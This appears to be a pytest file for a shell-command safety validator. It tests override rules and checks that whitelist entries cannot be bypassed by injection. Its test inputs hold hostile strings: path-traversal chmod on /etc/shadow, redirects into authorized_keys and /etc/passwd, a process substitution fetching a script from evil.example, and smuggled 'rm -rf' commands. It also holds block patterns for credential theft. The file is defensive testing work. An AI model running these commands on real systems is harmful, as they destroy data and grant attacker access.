        # open_port was always BLOCKED
        override_engine.apply_overrides(
            rule_overrides={"open_port": {"risk_level": "MEDIUM"}},
            category_overrides={},
        )
        rule = next(r for r in override_engine.rules if r.name == "open_port")
        assert rule.risk_level == RiskLevel.MEDIUM

    def test_category_empty_for_single_file_loading(self, test_rules_file):
        """Category defaults to empty string for single-file loading."""
        engine = RuleEngine(test_rules_file)
        for rule in engine.rules:
            assert rule.category == ""


class TestAllowBlockedOverride:
    """Test suite for allow_blocked_override escape hatch."""

    @pytest.fixture
    def engine_with_self_protection(self, tmp_path):
        """Create a RuleEngine with a BLOCKED rule and a self_protection rule."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "01_cloud_security.yaml").write_text(r"""
rules:
  - name: azure_credential_theft
    description: Azure credential and token access
    risk_level: BLOCKED
    patterns: ['az\s+account\s+get-access-token']
    alternatives: ["Use managed identity"]
""")

        (rules_dir / "14_self_protection.yaml").write_text(r"""
rules:
  - name: schlock_config_write
    description: "Self-protection: Write command targeting schlock configuration file"
    risk_level: BLOCKED
    patterns: ['\btee\b.*schlock-config\.yaml']
    alternatives: ["Edit manually"]
""")

        return RuleEngine.from_directory(rules_dir)

    def test_allow_blocked_override_downgrades_blocked_rule(self, engine_with_self_protection, caplog):
        """allow_blocked_override: true allows downgrading a BLOCKED rule."""
        engine_with_self_protection.apply_overrides(
            rule_overrides={"azure_credential_theft": {"risk_level": "HIGH", "allow_blocked_override": True}},
            category_overrides={},
        )
        rule = next(r for r in engine_with_self_protection.rules if r.name == "azure_credential_theft")
        assert rule.risk_level == RiskLevel.HIGH
        assert "SECURITY OVERRIDE" in caplog.text

    def test_without_allow_blocked_override_flag_still_blocked(self, engine_with_self_protection, caplog):
        """Without allow_blocked_override, BLOCKED rules remain blocked."""
        engine_with_self_protection.apply_overrides(
            rule_overrides={"azure_credential_theft": {"risk_level": "HIGH"}},
            category_overrides={},
        )
        rule = next(r for r in engine_with_self_protection.rules if r.name == "azure_credential_theft")
        assert rule.risk_level == RiskLevel.BLOCKED
        assert "Cannot downgrade BLOCKED rule" in caplog.text

    def test_allow_blocked_override_false_still_blocked(self, engine_with_self_protection):
        """allow_blocked_override: false does not unlock the escape hatch."""
        engine_with_self_protection.apply_overrides(
            rule_overrides={"azure_credential_theft": {"risk_level": "HIGH", "allow_blocked_override": False}},
            category_overrides={},
        )
        rule = next(r for r in engine_with_self_protection.rules if r.name == "azure_credential_theft")
        assert rule.risk_level == RiskLevel.BLOCKED

    def test_self_protection_rule_immutable_even_with_flag(self, engine_with_self_protection, caplog):
        """Self-protection rules cannot be downgraded even with allow_blocked_override."""
        engine_with_self_protection.apply_overrides(
            rule_overrides={"schlock_config_write": {"risk_level": "HIGH", "allow_blocked_override": True}},
            category_overrides={},
        )
        rule = next(r for r in engine_with_self_protection.rules if r.name == "schlock_config_write")
        assert rule.risk_level == RiskLevel.BLOCKED
        assert "immutable" in caplog.text

    def test_allow_blocked_override_does_not_affect_category_override(self, engine_with_self_protection):
        """allow_blocked_override in category override has no effect (rule-level only)."""
        engine_with_self_protection.apply_overrides(
            rule_overrides={},
            category_overrides={"cloud_security": {"risk_level": "HIGH", "allow_blocked_override": True}},
        )
        rule = next(r for r in engine_with_self_protection.rules if r.name == "azure_credential_theft")
        assert rule.risk_level == RiskLevel.BLOCKED


class TestWhitelistClearsOnlyWhatItDescribes:
    """LAB-4310: a whitelist entry must vouch for the command it DESCRIBES and no more.

    The layers are pinned SEPARATELY on purpose. The YAML bounds and the engine
    guard both reject "chmod -R 777 /tmp/../..", so a test that only went through
    is_whitelisted() would stay green with either one reverted - each masking the
    other's mutation. The shipped-pattern tests below therefore match the compiled
    regex directly, and the engine tests use a fixture entry that no YAML bound
    touches.
    """

    @pytest.fixture
    def shipped_rules_dir(self, data_dir):
        """The rule set schlock actually ships, not a synthetic fixture.

        LAB-4290's lesson (and this ticket's AC-7): a mutation survived 2416 tests
        because the shipped data hid the case. These entries are the artifact under
        test, so they are read from disk.
        """
        return data_dir / "rules"

    @staticmethod
    def _shipped_whitelist(shipped_rules_dir) -> list[str]:
        text = (shipped_rules_dir / "00_whitelist.yaml").read_text()
        return yaml.safe_load(text)["whitelist"]

    @pytest.fixture
    def chmod_tmp_patterns(self, shipped_rules_dir):
        """The two /tmp chmod entries, compiled, straight from the shipped YAML."""
        pats = [p for p in self._shipped_whitelist(shipped_rules_dir) if p.startswith("^chmod")]
        assert len(pats) == 2, f"expected exactly 2 /tmp chmod entries, got {pats}"
        return [re.compile(p) for p in pats]

    # --- Layer 1: the YAML bounds, measured on the pattern itself -------------

    @pytest.mark.parametrize(
        "command",
        [
            "chmod 755 /tmp/x /etc/shadow",  # AC-1: second operand rode the unanchored tail
            "chmod -R 777 /tmp/a /",  # AC-1: ... and this second operand is "/"
            "chmod 755 /tmp/x --reference=/etc/shadow",
        ],
    )
    def test_shipped_chmod_entries_reject_extra_operands(self, chmod_tmp_patterns, command):
        """Reverting the "$" anchor on either /tmp chmod entry fails this test."""
        assert not any(p.match(command) for p in chmod_tmp_patterns)

    @pytest.mark.parametrize(
        "command",
        [
            "chmod -R 777 /tmp/../..",  # AC-2/AC-5: this IS "chmod -R 777 /"
            "chmod 755 /tmp/../etc/shadow",
            "chmod 777 /tmp/../../etc/shadow",  # the one LAB-2764 row that is ours
            "chmod 755 /tmp/build/../../etc",  # ".." in a LATER segment, not just the first
            "chmod 755 /tmp/./x",  # a bare "." segment is refused by the same shape
        ],
    )
    def test_shipped_chmod_entries_reject_dot_dot_in_any_position(self, chmod_tmp_patterns, command):
        """AC-5. Reverting the segment shape to a plain charset fails this test.

        Separate from the engine guard test below: this one bypasses
        is_whitelisted() entirely, so the guard cannot stand in for the bound.
        """
        assert not any(p.match(command) for p in chmod_tmp_patterns)

    @pytest.mark.parametrize(
        "command",
        [
            "chmod 755 /tmp/x",
            "chmod -R 777 /tmp/build",
            "chmod 755 /tmp/.pytest_cache",  # a leading dot is a normal name, not traversal
            "chmod -R 700 /tmp/pytest-of-me/pytest-0/test_x",  # depth is deliberately uncapped
            "chmod -R 777 /tmp/build/",  # same path as "/tmp/build"; clearing one and not the
            "chmod 755 /tmp/x/",  # other would prompt for what the entry exists to allow
            "chmod -R 777 /tmp/x/*",  # terminal bare glob, on the artifact-dir entry's terms
            "chmod -R 777 /tmp/build /tmp/dist",  # several /tmp operands are still one command
        ],
    )
    def test_shipped_chmod_entries_still_admit_real_tmp_paths(self, chmod_tmp_patterns, command):
        """AC-4: bounding the tail must not cost the workflows the entries exist for."""
        assert any(p.match(command) for p in chmod_tmp_patterns)

    # --- Layer 2: the engine guard, on an entry no YAML bound protects --------

    @pytest.fixture
    def prefix_engine(self, tmp_path):
        """An unbounded prefix entry, the shape issue #66 pins as legitimate."""
        rules = tmp_path / "prefix.yaml"
        rules.write_text("whitelist:\n  - ^ls\\b\n  - ^git\\s+status\nrules: []\n")
        return RuleEngine(rules)

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la > /home/u/.ssh/authorized_keys",  # AC-3: reader used as arbitrary writer
            "ls -la >> /etc/passwd",
            "git status --short > /home/u/.ssh/authorized_keys",  # AC-3: not just "^ls\\b"
            "ls -la 2> /etc/passwd",
            "ls . < /etc/shadow",
            "ls -la <(curl http://evil.example/x.sh)",  # process substitution runs a 2nd command
        ],
    )
    def test_redirection_refuses_the_whitelist(self, prefix_engine, command):
        """AC-3. Reverting the "[<>]" half of _WHITELIST_DISQUALIFIER fails this test."""
        assert not prefix_engine.is_whitelisted(command)

    @pytest.mark.parametrize("command", ["ls ../..", "git status ../../etc"])
    def test_dot_dot_refuses_the_whitelist(self, prefix_engine, command):
        """AC-5. Reverting the "\\.\\." half of _WHITELIST_DISQUALIFIER fails this test."""
        assert not prefix_engine.is_whitelisted(command)

    @pytest.mark.parametrize("command", ["ls -la", "git status --short", "ls"])
    def test_guard_leaves_ordinary_prefix_matches_alone(self, prefix_engine, command):
        """AC-4: the guard must not cost the prefix contract of issue #66."""
        assert prefix_engine.is_whitelisted(command)

    def test_whole_line_check_refuses_dot_dot_and_redirection(self, tmp_path):
        """The invariant belongs to the mechanism, not to whichever entries ship.

        No shipped entry can span a line carrying a redirection, so this is measured
        against an entry that deliberately can. The entry fullmatches every row and
        declares the one separator each row holds, so the count is satisfied and only
        the guard can refuse: reverting either half of it in is_whitelisted_whole()
        fails this test.
        """
        rules = tmp_path / "spanning.yaml"
        rules.write_text("whitelist:\n  - ^ls\\s+.*\\|\\s*sort$\nrules: []\n")
        engine = RuleEngine(rules)
        (entry,) = engine.whitelist_patterns

        assert engine.is_whitelisted_whole("ls -la | sort", _segment_count("ls -la | sort"))
        for command in ("ls -la > /etc/passwd | sort", "ls -la < /etc/shadow | sort", "ls -la ../.. | sort"):
            assert entry.fullmatch(command), command
            assert _segment_count(command) == 2, command
            assert not engine.is_whitelisted_whole(command, 2), command

    # --- The verdicts, end to end on the shipped rule set ---------------------

    def test_attack_rows_no_longer_clear_the_shipped_whitelist(self, shipped_rules_dir):
        """AC-1/2/3/5 through the real engine, all entries loaded together."""
        engine = RuleEngine.from_directory(shipped_rules_dir)
        for command in (
            "chmod 755 /tmp/x /etc/shadow",
            "chmod -R 777 /tmp/a /",
            "chmod -R 777 /tmp/../..",
            "chmod 755 /tmp/../etc/shadow",
            "chmod 777 /tmp/../../etc/shadow",
            "ls -la > /home/u/.ssh/authorized_keys",
            "ls -la >> /etc/passwd",
            "git status --short > /home/u/.ssh/authorized_keys",
        ):
            assert not engine.is_whitelisted(command), command

    def test_positive_controls_still_clear_the_shipped_whitelist(self, shipped_rules_dir):
        """AC-4: the five controls stay whitelisted and stay SAFE."""
        engine = RuleEngine.from_directory(shipped_rules_dir)
        for command in (
            "chmod 755 /tmp/x",
            "chmod -R 777 /tmp/build",
            "rm -rf .git/hooks",
            "ls -la",
            "git status",
        ):
            assert engine.is_whitelisted(command), command
            assert engine.match_command(command).risk_level == RiskLevel.SAFE, command


class TestWhitelistRefusesCommandSeparators:
    """LAB-4310 review finding: every "\\s" in a whitelist pattern matches a NEWLINE.

    So a "$"-anchored entry spans a string bash runs as several commands:
    "chmod\\n-R\\n777\\n/tmp/evil.sh" satisfies the /tmp chmod entry end to end,
    with "/tmp/evil.sh" left as a command bash executes, not an operand. The prefix
    check refuses a line break outright. The whole-line check that short-circuits
    validator.py's multi-segment branch refuses it by counting instead: the extra
    lines are extra commands the entry never declared.
    """

    @pytest.fixture
    def shipped_engine(self, data_dir):
        return RuleEngine.from_directory(data_dir / "rules")

    @pytest.mark.parametrize(
        "command",
        [
            "chmod\n-R\n777\n/tmp/evil.sh",  # the regression the "$" anchor introduced
            "chmod\n777\n/tmp/evil.sh",
            "chmod -R\n777 /tmp/x",
            "rm\n-rf\n.git/hooks",  # pre-existing, same cause, closed by the same guard
            "chmod 755 /tmp/x\rrm -rf /",  # a bare CR is a separator to some readers
            "ls -la\rrm -rf /",  # the row above is refused by the /tmp entry's charset, guard or not; this only by it
            # The one shipped entry that declares a separator, with the extra lines riding its
            # user slot: it fullmatches, so only the count stands between it and SAFE.
            "gh auth token | docker login ghcr.io -u\npoweroff\n--password-stdin",
        ],
    )
    def test_embedded_newline_refuses_both_whitelist_checks(self, shipped_engine, command):
        """Reverting the "\\n\\r" half of _WHITELIST_DISQUALIFIER fails this test.

        is_whitelisted_whole is asserted explicitly: it is the multi-segment
        short-circuit, so it is the one that skips the per-segment loop. It carries
        no newline guard. Only the gh row exercises the count here: the other rows
        match no entry that declares a separator, so no count can clear them.
        """
        assert not shipped_engine.is_whitelisted(command)
        assert not shipped_engine.is_whitelisted_whole(command, _segment_count(command))

    @pytest.mark.parametrize("command", ["git status\n", "ls -la\n", "chmod 755 /tmp/x\n"])
    def test_one_trailing_newline_still_whitelists(self, shipped_engine, command):
        """The guard reads command.rstrip(); dropping that rstrip fails this test.

        A trailing newline is not a separator - there is no second command after
        it. Refusing it would be a regression, not a fix.
        """
        assert shipped_engine.is_whitelisted(command)

    def test_compile_warns_when_an_entry_can_never_match(self, tmp_path, caplog):
        """A user whitelist entry describing a redirect is refused before patterns
        are consulted, so it would silently never fire. Warn rather than fail
        silently - the user has nothing else to go on."""
        rules = tmp_path / "userwl.yaml"
        rules.write_text("whitelist:\n  - '^psql\\s+mydb\\s+<\\s+schema\\.sql$'\nrules: []\n")
        with caplog.at_level("WARNING"):
            engine = RuleEngine(rules)
        assert "may never match" in caplog.text
        assert not engine.is_whitelisted("psql mydb < schema.sql")


class TestDeclaredCountIsWhatBashRuns:
    """LAB-5377: an entry must not declare more commands than bash finds in the text it matches.

    `is_whitelisted_whole` clears a line when the parser finds one more command than the entry
    writes separators. A separator character bash does not read as one -- a redirection's `&`, an
    escaped `;`, a `;` in a regex comment -- declares a command the author never described, and
    that is a slot for one more. Likewise a command the parser never counts. The mutation-bearing
    tests call `_declared_separators` and `is_whitelisted_whole` directly: through
    `validate_command`, `_WHOLE_LINE_DISQUALIFIER` or a tighter shipped entry can refuse the same
    line and hide a reverted rule.
    """

    @staticmethod
    def _engine(tmp_path, pattern: str) -> RuleEngine:
        rules = tmp_path / "user_whitelist.yaml"
        rules.write_text(yaml.safe_dump({"whitelist": [pattern], "rules": []}))
        return RuleEngine(rules)

    @pytest.mark.parametrize(
        ("source", "declared"),
        [
            # A redirection's `&` sits beside `>` or `<`, before or after, in any spelling.
            (r"^a\s+2>&1$", 0),
            (r"^a\s+>&2$", 0),
            (r"^a\s+<&3$", 0),
            (r"^a\s+&>\S+$", 0),
            (r"^a\s+&>>\S+$", 0),
            (r"^a\s+2\>&1$", 0),
            (r"^a\s+2[>]&1$", 0),
            (r"^a\s+&\>\S+$", 0),
            (r"^a\s+\<&3$", 0),
            (r"^a\s+[<]&3$", 0),
            (r"^a\s+2>\&1$", 0),
            (r"^a\s+2>[&]1$", 0),
            # ...so a pipeline entry keeps its one pipe, whether the redirection is required or not.
            (r"^npm\s+run\s+\S+\s+2>&1\s*\|\s*tee\s+\S+$", 1),
            (r"^npm\s+run\s+\S+(\s+2>&1)?\s*\|\s*tee\s+\S+$", 1),
            (r"^npm\s+test\s+&>\s*\S+$", 0),
            # `|&` pipes stderr too and `&&` is AND: both still join two commands.
            (r"^a\s*\|&\s*b$", 1),
            (r"^a\s*&&\s*b$", 1),
            # After a literal backslash a separator is escaped: bash reads `\;` as an argument.
            (r"^find\s+\S+\s+-name\s+\S+\s+-exec\s+rm\s+\{\}\s+\\;$", 0),
            (r"^find\s+\S+\s+-exec\s+rm\s+\{\}\s+[\\];$", 0),
            (r"^find\s+src\s+-exec\s+wc\s+\{\}\s+\\;\s*\|\s*tee\s+[\w.]+$", 1),
            (r"^echo\s+a\\&\s+\S+$", 0),
            (r"^echo\s+a\\\|\s+\S+$", 0),
            (r"^echo\s+a\\\;\s+\S+$", 0),
            # A verbose flag, global or scoped, or an inline comment carries text that is never
            # matched. Such an entry is read as declaring nothing: it clears no line.
            (r"(?x) ^make \s+ \S+ $  # build; nothing else", 0),
            (r"^make\s+\S+(?#one; command)$", 0),
            (r"(?ix) ^make \s+ \S+ $  # build; nothing else", 0),
            (r"(?sx) ^make \s+ \S+ $  # a; b", 0),
            ("(?x:^make \\s+ \\S+ # a; b\n)$", 0),
            # A flag group that is not verbose, or that turns verbose off, changes nothing.
            (r"(?i:^a\s*;\s*b)$", 1),
            (r"(?-x:^a\s*;\s*b)$", 1),
        ],
    )
    def test_only_what_bash_reads_as_a_separator_is_declared(self, source, declared):
        re.compile(source)  # every row is an entry a user could write
        assert _declared_separators(source) == declared

    def test_shipped_entries_keep_their_declared_counts(self, data_dir):
        """Only the gh/docker pipeline declares a separator; every other shipped entry speaks for one command."""
        shipped = yaml.safe_load((data_dir / "rules" / "00_whitelist.yaml").read_text())["whitelist"]
        assert any("docker" in pattern for pattern in shipped)
        for pattern in shipped:
            assert _declared_separators(pattern) == (1 if "docker" in pattern else 0), pattern

    @pytest.mark.parametrize("tail", ["\n\\", "\n \\", "\n\t\\", ";\\", "&\\"])
    def test_a_lone_trailing_backslash_is_a_command_the_parser_does_not_count(self, tmp_path, tail):
        """A backslash with nothing after it escapes nothing, so bash keeps it as a literal.

        As the last word of a line -- alone, or straight after `;` or `&` -- that word is a command
        named `\\`: bash 5.3 exits 127 ("\\: command not found") when none exists, and runs one
        planted on PATH. The parser drops the word without counting it, so the count sees two
        commands where bash runs three.
        """
        engine = self._engine(tmp_path, r"^foo\s*\|\s*bar[\s\S]*$")
        (entry,) = engine.whitelist_patterns
        command = "foo | bar x" + tail

        assert entry.fullmatch(command.strip())
        assert _segment_count(command) == 2, "the parser counts the `\\` now; the guard may be redundant"
        assert not engine.is_whitelisted_whole(command, 2)

    def test_an_escaped_trailing_backslash_is_an_argument_and_still_clears(self, tmp_path):
        r"""An even run is escaped backslashes: `bar x\\` hands `bar` the argument `x\`."""
        engine = self._engine(tmp_path, r"^foo\s*\|\s*bar[\s\S]*$")
        for command in ("foo | bar x", "foo | bar x\\\\"):
            assert _segment_count(command) == 2, command
            assert engine.is_whitelisted_whole(command, 2), command

    # (user entry, line, risk level with the entry, a rule that must fire). Each line clears the
    # gate on the count alone before this fix; the risk level is the one it gets with no entry.
    ROWS = [
        (
            r"^npm\s+run\s+\S+(\s+2>&1)?\s*\|\s*tee\s+\S+$",
            "npm run build;rm${IFS}-rf${IFS}~ | tee log",
            RiskLevel.BLOCKED,
            "ifs_obfuscation",
        ),
        (
            r"^find\s+\S+\s+-name\s+\S+\s+-exec\s+rm\s+\{\}\s+\\;$",
            r"find x;rm${IFS}-rf${IFS}~ -name y -exec rm {} \;",
            RiskLevel.BLOCKED,
            "ifs_obfuscation",
        ),
        (
            r"^find\s+src\s+-exec\s+wc\s+\{\}\s+\\;\s*\|\s*tee\s+[\w.]+$",
            "find src -exec wc {} \\; | tee\nreboot",
            RiskLevel.HIGH,
            "file_truncation",
        ),
        (r"^echo\s+a\\&\s+\S+$", r"echo a\& x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        (r"^echo\s+a\\\|\s+\S+$", r"echo a\| x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        (r"(?x) ^make \s+ \S+ $  # build; nothing else", "make x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        (r"^make\s+\S+(?#one; command)$", "make x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        (r"(?ix) ^make \s+ \S+ $  # build; nothing else", "make x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        (r"(?sx) ^make \s+ \S+ $  # a; b", "make x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        ("(?x:^make \\s+ \\S+ # a; b\n)$", "make x;rm${IFS}-rf${IFS}~", RiskLevel.BLOCKED, "ifs_obfuscation"),
        (r"^foo\s*\|\s*bar[\s\S]*$", "foo | bar x\n\\", RiskLevel.SAFE, None),
        (r"^foo\s*\|\s*bar[\s\S]*$", "foo | bar x\n \\", RiskLevel.SAFE, None),
        (r"^foo\s*\|\s*bar[\s\S]*$", "foo | bar x\n\t\\", RiskLevel.SAFE, None),
    ]

    @pytest.mark.parametrize(("pattern", "command", "risk", "rule"), ROWS)
    def test_the_whole_line_check_refuses_a_line_with_an_undeclared_command(self, tmp_path, pattern, command, risk, rule):
        engine = self._engine(tmp_path, pattern)
        (entry,) = engine.whitelist_patterns

        assert entry.fullmatch(command.strip())
        assert not engine.is_whitelisted_whole(command, _segment_count(command))

    @pytest.mark.usefixtures("no_shellcheck")
    @pytest.mark.parametrize(("pattern", "command", "risk", "rule"), ROWS)
    def test_the_line_gets_the_verdict_it_gets_with_no_entry(self, tmp_path, data_dir, pattern, command, risk, rule):
        """Refusing the whitelist is not refusing the command: the line is judged one command at a time.

        Matched rules are compared by inclusion. For the `make` rows the segment loop's prefix
        test still clears `make x` on its own, so `make_build` is absent with the entry and
        present without it.
        """
        rules_dir = tmp_path / "rules"
        shutil.copytree(data_dir / "rules", rules_dir)
        whitelist = rules_dir / "00_whitelist.yaml"
        data = yaml.safe_load(whitelist.read_text())
        data["whitelist"].append(pattern)
        whitelist.write_text(yaml.safe_dump(data))

        result = validator.validate_command(command, config_path=str(rules_dir))

        assert result.message != "Command is whitelisted"
        assert result.risk_level == risk
        if rule is None:
            assert result.message == "No security rules matched"
            assert result.matched_rules == []
        else:
            assert rule in result.matched_rules

    @pytest.mark.parametrize(
        ("pattern", "command"),
        [
            (r"^find\s+src\s+-exec\s+wc\s+\{\}\s+\\;\s*\|\s*tee\s+[\w.]+$", r"find src -exec wc {} \; | tee log"),
            (r"^npm\s+run\s+\S+(\s+2>&1)?\s*\|\s*tee\s+\S+$", "npm run build | tee log"),
        ],
    )
    def test_the_line_an_entry_was_written_for_now_clears(self, tmp_path, pattern, command):
        """The over-count also cost the author their own line: declared three commands, found two."""
        engine = self._engine(tmp_path, pattern)
        assert _segment_count(command) == 2
        assert engine.is_whitelisted_whole(command, 2)
